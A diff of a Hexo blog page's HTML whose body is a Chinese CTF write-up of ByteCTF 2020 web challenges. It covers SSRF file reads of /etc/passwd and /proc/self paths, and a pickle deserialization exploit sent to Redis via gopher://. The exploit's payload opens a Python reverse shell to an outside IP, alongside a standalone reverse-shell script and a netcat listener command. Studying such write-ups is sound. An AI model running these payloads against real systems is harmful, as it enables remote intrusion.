@@ -1,262 +1,164 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+<html lang="zh-CN">
 
-
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
-  <link rel="icon" type="image/png" href="/img/favicon.png">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="网络空间安全,高效率工具,计算机基础,经验分享,CTF" />
+  <meta name="author" content="slug01sh" />
+  <meta name="description" content="最爱 Python，会一点开发，CTF 卑微的 Web 手。 主攻代码审计、程序分析。" />
   
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="最爱 Python，会一点开发，CTF 卑微的 Web 手。 主攻代码审计、程序分析。">
-  <meta name="author" content="slug01sh">
-  <meta name="keywords" content="网络空间安全,高效率工具,计算机基础,经验分享,CTF">
-  <title>2020年10月ByteCTF部分web题解 - 积淀｜小杰的个人博客</title>
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
-
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
-
   
+  <title>
     
-    
+      2020年10月ByteCTF部分web题解 
       
-      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+      
+      |
     
-  
+     积淀｜小杰的个人博客
+  </title>
 
   
-    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
   
 
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
 
 
-<!-- 主题依赖的图标库，不要自行修改 -->
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
 
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-<!-- 自定义样式保持在最底部 -->
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
 
 
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"slug01sh.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":"G-WTRCMZDFLE","gtag":"G-WTRCMZDFLE","tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.1.1"></head>
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-WTRCMZDFLE"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-WTRCMZDFLE');
+    </script>
+  
+
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="积淀｜小杰的个人博客" type="application/atom+xml">
+</head>
 
 
-<body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>积淀｜小杰的个人博客</strong>&nbsp;</a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/ctf/">
-                <i class="iconfont icon-user-fill"></i>
-                学习资源导航
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                友链
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;</a>
-          </li>
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" href="javascript:">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Oranges</a></div>
   </div>
-</nav>
-
-    <div class="banner" id="banner" parallax=true
-         style="background: url('https://rmt.dogedoge.com/fetch/fluid/storage/bg/dojm2h.png?w=1920&q=100&fmt=webp') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="2020年10月ByteCTF部分web题解">
-              
-            </span>
-
-            
-              <div class="mt-3">
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-10-25 09:22" pubdate>
-        2020年10月25日 上午
-      </time>
-    </span>
-  
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
 </div>
 
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      3.3k 字
-    </span>
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
   
 
   
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      49
-       分钟
-    </span>
+
   
 
   
-  
-</div>
-
-            
-          </div>
-
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">2020年10月ByteCTF部分web题解</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2020-10-25 09:22:59
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/CTF/" title="CTF">
+                    <b>#</b> CTF
+                  </a>
+                </span>
+                
+              </span>
           
-        </div>
       </div>
-    </div>
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">2020年10月ByteCTF部分web题解</h1>
-            
-            <div class="markdown-body">
-              <p>题解和题目地址：<a target="_blank" rel="noopener" href="https://github.com/ctfwiki/ctf_game_history/blob/master/2020/ByteCTF.md">https://github.com/ctfwiki/ctf_game_history/blob/master/2020/ByteCTF.md</a><br>官方题解：<a target="_blank" rel="noopener" href="https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#xQHQ9D">https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#xQHQ9D</a></p>
-<hr>
-<a id="more"></a>
-
-
-<p>用于爆破 md5 的脚本（验证码）：</p>
+      <div class="markdown-body">
+        <p>用于爆破 md5 的脚本（验证码）：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># crack.py</span><br><br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(s.encode()).hexdigest()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    c = input()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">9999999999</span>):<br>        <span class="hljs-keyword">if</span> md5(str(i)).startswith(c):<br>            print(i)<br>            print(<span class="hljs-string">&#x27;----------------&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure>
 
 <hr>
@@ -271,7 +173,7 @@
 <p>经过测试，该网站会爬取提交的链接以及链接中的外链，并且提交链接的类型只能是 HTTPS。我当时只在提交链接的部分测试了SSRF，以后在做题时，需要边做边写题解，这样会让自己的思路更加的清晰和正确。</p>
 <p>在 服务器编写 1.html ，然后提交 url 即可得到 /etc/passwd 文件，成功本地文件包含，返回结果如下。</p>
 <figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sml"><br>b&#x27;&lt;a href=<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;\n&#x27;<br><br></code></pre></td></tr></table></figure>
-<p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/C64DAEFD-214C-40D8-8BFF-24326D290575.png" srcset="/img/loading.gif"></p>
+<p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/C64DAEFD-214C-40D8-8BFF-24326D290575.png"></p>
 <p>考虑去读取爬虫的源码，但是并不知道路径，尝试 proc 目录。GET 新姿势，在服务器源码中写入下面的代码并提交。</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cmdline&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure>
 <p>proc/self/cmdline 中 /proc/self  是指向当前进程的内存，/proc/self/cmdline 启动进程时执行的命令。类似的接口还有：</p>
@@ -292,7 +194,7 @@
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/scrapy.cfg&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure>
 <p>其中 /proc/self/cwd/ 指向工作路径（current work directory 简称 cwd），读取工作路径下的 scrapy.cfg 文件。再次提交 url，返回结果如下：</p>
 <figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs latex"># scrapy.cfg<br><br>b&#x27;# Automatically created by: scrapy startproject<span class="hljs-tag">\<span class="hljs-name">n</span></span>#<span class="hljs-tag">\<span class="hljs-name">n</span></span># For more information about the [deploy] section see:<span class="hljs-tag">\<span class="hljs-name">n</span></span># https://scrapyd.readthedocs.io/en/latest/deploy.html<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">n</span><span class="hljs-string">[settings]</span></span><span class="hljs-tag">\<span class="hljs-name">ndefault</span> = </span>bytectf.settings<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">n</span><span class="hljs-string">[deploy]</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span>#url = http://localhost:6800/<span class="hljs-tag">\<span class="hljs-name">nproject</span> = </span>bytectf<span class="hljs-tag">\<span class="hljs-name">n</span></span>&#x27;<br><br></code></pre></td></tr></table></figure>
-<p>这种格式的文本不便于进行阅读，Python 的 Bytes 直接输出就会呈现这种效果，使用 vscode 的替换功能将 \n 转换成“换行”。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/472EE1BB-6765-4B4D-B9F0-341E25B7D163.png" srcset="/img/loading.gif"><br>修改为“正则模式”进行替换，将 “\n” 替换成 “\n”。通过上面的文本，我们就能够读取所有的文件了。</p>
+<p>这种格式的文本不便于进行阅读，Python 的 Bytes 直接输出就会呈现这种效果，使用 vscode 的替换功能将 \n 转换成“换行”。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/472EE1BB-6765-4B4D-B9F0-341E25B7D163.png"><br>修改为“正则模式”进行替换，将 “\n” 替换成 “\n”。通过上面的文本，我们就能够读取所有的文件了。</p>
 <p>尝试读取 setting 文件。</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/setting.py&quot;</span>&gt;（凭感觉在写代码。。）<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/settings.py&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure>
 <p>？？？做着做着访问不了了（希望环境没事🙏。等待几分钟后环境恢复，估计是在重启。</p>
@@ -322,15 +224,15 @@
 <h2 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h2><p>文件基本读取完成，整理一下已知信息：（分析数据流，然后分析数据流中间危险函数）</p>
 <ol>
 <li>web 应用将任务传给redis，redis做为 broker（dumps）</li>
-<li>爬虫从这个 broker 处获取任务，最后将任务的结果存入 mongodb，最基础的一套分布式应用架构（loads）。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/AB748B08-5068-48EF-B8EC-536FEB650AAC.png" srcset="/img/loading.gif"><br>pickle 函数！！！Python 反序列化漏洞，目前可以确定漏洞类型为 Python 反序列化。</li>
+<li>爬虫从这个 broker 处获取任务，最后将任务的结果存入 mongodb，最基础的一套分布式应用架构（loads）。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/AB748B08-5068-48EF-B8EC-536FEB650AAC.png"><br>pickle 函数！！！Python 反序列化漏洞，目前可以确定漏洞类型为 Python 反序列化。</li>
 </ol>
 <p>题解的exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># exp1.py</span><br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>(<span class="hljs-params">object</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        s = <span class="hljs-string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;120.55.50.65&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (s,))<br><br><br>test = str(pickle.dumps(exp()))<br>poc = test.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\\n&#x27;</span>).replace(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]<br>poc =<span class="hljs-string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="hljs-string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="hljs-string">&#x27;&quot;&#x27;</span>)<br>print(poc)<br><br></code></pre></td></tr></table></figure>
-<p>将其中的 vps 地址和端口改为自己的，在自己的服务器运行 nc -lvvp 9999，将生成的 payload 在 <a target="_blank" rel="noopener" href="http://101.200.50.18:30010/result?url=http://120.55.50.65/1.html">http://101.200.50.18:30010/result?url=http://120.55.50.65/1.html</a> 的 url= 之后，即可 get shell。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/F195950B-B1C3-4F53-AEC0-E9502B8ED0AC.png" srcset="/img/loading.gif"><br>最后得到 flag 为 ByteCTF{59c9c566-1167-4f66-950e-043fe53a1db5}</p>
+<p>将其中的 vps 地址和端口改为自己的，在自己的服务器运行 nc -lvvp 9999，将生成的 payload 在 <a target="_blank" rel="noopener" href="http://101.200.50.18:30010/result?url=http://120.55.50.65/1.html">http://101.200.50.18:30010/result?url=http://120.55.50.65/1.html</a> 的 url= 之后，即可 get shell。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/F195950B-B1C3-4F53-AEC0-E9502B8ED0AC.png"><br>最后得到 flag 为 ByteCTF{59c9c566-1167-4f66-950e-043fe53a1db5}</p>
 <h2 id="拆解exp"><a href="#拆解exp" class="headerlink" title="拆解exp"></a>拆解exp</h2><p>exp 中知识盲区太多。可以考虑整理过后基础补充吧（Nnn 大佬还提供一种思路——打 redis），整理后的 exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># exp2.py</span><br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>(<span class="hljs-params">object</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        s = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            python -c  &#x27;import socket,subprocess,os;</span><br><span class="hljs-string">                        </span><br><span class="hljs-string">                        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="hljs-string">                        s.connect((&quot;120.55.50.65&quot;,9999));</span><br><span class="hljs-string">                        os.dup2(s.fileno(),0);</span><br><span class="hljs-string">                        os.dup2(s.fileno(),1);</span><br><span class="hljs-string">                        os.dup2(s.fileno(),2);</span><br><span class="hljs-string">                        p=subprocess.call(</span><br><span class="hljs-string">                                            [&quot;/bin/sh&quot;,&quot;-i&quot;]</span><br><span class="hljs-string">                                          );</span><br><span class="hljs-string">                        &#x27;</span><br><span class="hljs-string">            &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (s,))<br><br><br>test = str(pickle.dumps(exp()))<br>poc = test.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\\n&#x27;</span>).replace(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]<br>poc =<span class="hljs-string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="hljs-string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="hljs-string">&#x27;&quot;&#x27;</span>)<br>print(poc)<br><br></code></pre></td></tr></table></figure>
 <p>接下来就一点点分析这个 exp，然后自己尝试些 exp。</p>
-<h3 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h3><p>我将那段 <code>__reduce__</code>中的代码在本地进行执行，测试 bash 命令的正确性。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/DF0CABC7-4537-44C8-8289-28A1F9C990A2.png" srcset="/img/loading.gif"><br>从上图可以看出，经过整理后的 bash 命令不能执行，也就印证了 exp2 生成的 payload 无法反弹 shell。</p>
+<h3 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h3><p>我将那段 <code>__reduce__</code>中的代码在本地进行执行，测试 bash 命令的正确性。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/DF0CABC7-4537-44C8-8289-28A1F9C990A2.png"><br>从上图可以看出，经过整理后的 bash 命令不能执行，也就印证了 exp2 生成的 payload 无法反弹 shell。</p>
 <p>在这里补了一下 Python 反弹 shell 的姿势。尝试使用自己的反弹 shell 脚本 反弹 shell。Python 反弹 shell 的脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> os<br><br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>s.connect((<span class="hljs-string">&quot;120.55.50.65&quot;</span>, <span class="hljs-number">9999</span>))<br>os.dup2(s.fileno(), <span class="hljs-number">0</span>)<br>os.dup2(s.fileno(), <span class="hljs-number">1</span>)<br>os.dup2(s.fileno(), <span class="hljs-number">2</span>)<br>p = subprocess.call(<br>    [<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-i&quot;</span>]<br>)<br><br></code></pre></td></tr></table></figure>
 <p>在 <a target="_blank" rel="noopener" href="http://www.onelinerizer.com/">one-lined python 官网</a>生成一行的 python，并合成成命令</p>
@@ -358,282 +260,321 @@
 <p>这个题目已经补完了！最重要的思想已经 GET，每次补题都会补题时间过长。。导致很多题目没补完，这次也是。(还有可能是比较菜的原因-。-#)</p>
 <hr>
 <p>官方已经将环境关闭了，额，补不完了。</p>
-
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
-                    
-                  </div>
-                
-                
-              </div>
-              
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
-              
-              
-                <div class="post-prevnext">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/3ac02a0dcee2/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">PDFCreator题解</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/276016d77f60/">
-                        <span class="hidden-mobile">2020年10月N1CTF部分web题解</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-              <!-- Comments -->
-              <article class="comments" id="comments">
-                
-                
-
-              </article>
-            
-          </article>
-        </div>
       </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/276016d77f60/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2020-10-25 09:22:59
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/CTF/" title="CTF">
+                        <b>#</b> CTF
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/3ac02a0dcee2/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
     </div>
     
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-      </div>
-    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
   </div>
-</div>
-
-<!-- Custom -->
-
-
-    
-
-    
-      <a id="scroll-top-button" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
